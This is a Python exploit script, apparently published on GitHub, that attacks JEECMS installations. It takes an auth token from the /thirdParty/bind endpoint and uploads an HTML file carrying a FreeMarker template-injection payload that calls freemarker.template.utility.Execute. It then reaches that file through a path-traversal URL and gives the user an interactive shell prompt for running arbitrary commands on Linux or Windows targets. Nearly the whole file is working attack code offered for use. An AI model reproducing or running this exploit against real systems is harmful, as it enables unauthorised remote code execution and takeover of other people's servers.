#!/usr/bin/python
# -*- coding:utf-8 -*-
import requests
import sys
import json
import os
import time
import string
import argparse
import readchar
import random
from requests_toolbelt.multipart.encoder import MultipartEncoder


banner =''' 
   ____ _______ _______ ______ ______     _     _____ ______    _____ _______ ______ _______ 
  (_____|_______|_______) _____)  ___ \   | |   (_____)  ___ \  (_____|_______) _____|_______)
     _   _____   _____ | /     | | _ | |   \ \ ___ _  | |   | |    _   _____ | /      _       
    | | |  ___) |  ___)| |     | || || |    \ (___) | | |   | |   | | |  ___)| |     | |      
 ___| | | |_____| |____| \_____| || || |_____) ) _| |_| |   | |___| | | |____| \_____| |_____ 
(____/  |_______)_______)______)_||_||_(______/ (_____)_|   |_(____/  |_______)______)\______)                                                               
                                                        https://github.com/bigsizeme/                                                        
                                                        '''
print(banner)
proxies = {'http': 'http://127.0.0.1:8099', 'https': 'http://127.0.0.1:8099'}

def random_string_generator(str_size, allowed_chars):
    return ''.join(random.choice(allowed_chars) for x in range(str_size))
chars = string.ascii_letters
def getToken(url):
    if '://' not in url:
        target = 'https://%s' % url if ':443' in url else 'http://%s' % url
    else:
        target = url
    temp = "/thirdParty/bind"
    target = url+temp
    #print("checking url:" + target)
    proxies = {'http': 'http://127.0.0.1:8099', 'https': 'http://127.0.0.1:8099'}
    headers = {'Content-Type': 'application/json','User-Agent':'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0','Accept-Language':'en-US,en;q=0.5','Accept-Encoding':'gzip, deflate','X-Requested-With':'XMLHttpRequest','Content-Length':'79'}

    data = {"username":random_string_generator(5,chars),"loginWay": 1, "loginType": "QQ", "thirdId": "abcdefg"}

    response = requests.post(url=target,headers=headers,json=data,proxies=proxies,verify=False)
    if response.status_code ==200:
    #    print("111111")
        null =""
        text =response.text
        obj = json.dumps(text)
        t1 =json.loads(text)
        
        token = t1['data']['JEECMS-Auth-Token']
        print("JEECMS-Auth-Token: "+token)
        return token
    else:
        print("get token error")

def getPath(url,token):
    if '://' not in url:
        target = 'https://%s' % url if ':443' in url else 'http://%s' % url
    else:
        target = url
    temp = "/member/upload/o_upload"
    target = url+temp
    shellCode = '''${site.getClass().getProtectionDomain().getClassLoader().loadClass("freemarker.template.ObjectWrapper").getField("DEFAULT_WRAPPER").get(null).newInstance(site.getClass().getProtectionDomain().getClassLoader().loadClass("freemarker.template.utility.Execute"), null)(cmd)}'''
    headers = {'Content-Type': 'multipart/form-data; boundary=-----------------------------1250178961143214655620108952','User-Agent':'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0','Accept-Language':'en-US,en;q=0.5','Accept-Encoding':'gzip, deflate','X-Requested-With':'XMLHttpRequest','Content-Length':'606','JEECMS-Auth-Token':token}

    multipart_encoder = MultipartEncoder(
        fields={
            "uploadFile": (
            "b.html", shellCode, 'text/html'),
            "typeStr": "File"
        },
        boundary='-----------------------------1250178961143214655620108952'
    )   
    response = requests.post(url=target,headers=headers,data=multipart_encoder,proxies=proxies,verify=False)

    if response.status_code ==200:
        null =""
        text =response.text
        obj = json.dumps(text)
        t1 =json.loads(text)
        path = t1['data']['fileUrl']
        return path
    else:
        print("get path error")


def parse_args():
    # parse the arguments
    parser = argparse.ArgumentParser(epilog="\tExample: \r\npython " + sys.argv[0] + " -u target")
    parser._optionals.title = "OPTIONS"
    parser.add_argument('-u', '--url', help="Target url.", default="http://127.0.0.1:8080", required=True)
    parser.add_argument('-c', '--cmd', help="Commond", default="whoami", required=False)
    return parser.parse_args()

if __name__ == '__main__':
    args = parse_args()
    url = args.url
    cmd = args.cmd

    token = getToken(url=url)
    time.sleep(1)
    path = getPath(url,token)
    time.sleep(1)
    path = path.replace("/","-")
    temp ="/..-..-..-..-.."
    url = url+temp+path
    print("resultUrl: ",url)
    url = url.replace("html","htm")

    linux  = url+"?cmd=echo bigsizeme"
    windiws =  url+"?cmd=cmd /c echo bigsizeme"
    relinux = requests.get(linux,verify=False)
    resplinux = relinux.text
    print(resplinux)
    rewin = requests.get(windiws,verify=False)
    respwin = rewin.text
    print(respwin)
    inputStr = ""
    if "bigsizeme" in resplinux:
        while True:
            inputStr = input("shell>")
            if inputStr:
                if inputStr == 'exit':
                    print("bye")
                    break
                else:
                    print(requests.get(url+"?cmd="+inputStr).text)
    else :
        while True:
            inputStr = input("shell>")
            if inputStr:
                if inputStr == 'exit':
                    print("bye")
                    break
                else:
                    print(requests.get(url+"?cmd=cmd /c "+inputStr).text)
   # print("\nvul:%s url:%s\t\n" %(str(r["vul"]),url))


